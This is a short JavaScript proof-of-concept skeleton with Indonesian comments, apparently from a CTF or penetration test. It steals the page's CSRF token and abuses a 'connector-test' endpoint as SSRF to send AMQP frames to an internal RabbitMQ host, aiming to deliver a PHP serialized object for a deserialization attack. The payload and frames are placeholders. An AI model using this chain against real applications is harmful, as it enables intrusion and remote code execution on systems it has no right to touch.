(async () => {
  // Ambil CSRF token dan themeId dari window.__BOOTSTRAP__
  const csrf = window.__BOOTSTRAP__.csrfToken;
  const themeId = window.__BOOTSTRAP__.themeId;
  
  // Ganti dengan hasil serialize PHP nanti
  const phpSerialized = "O:14:\"PreviewBatch\":5:{...}"; 
  const phpBase64 = btoa(phpSerialized);
  
  // Kirim ke connector-test
  await fetch(`/api/reviews/${themeId}/connector-test`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      csrf: csrf,
      host: 'rabbitmq',
      port: 5672,
      segments_b64: [
        // AMQP frame 1: Connection.Start-Ok
        "QU1RUAABAAEB...", 
        // Frame 2: Basic.Publish dengan body = phpBase64
      ]
    })
  });
})();
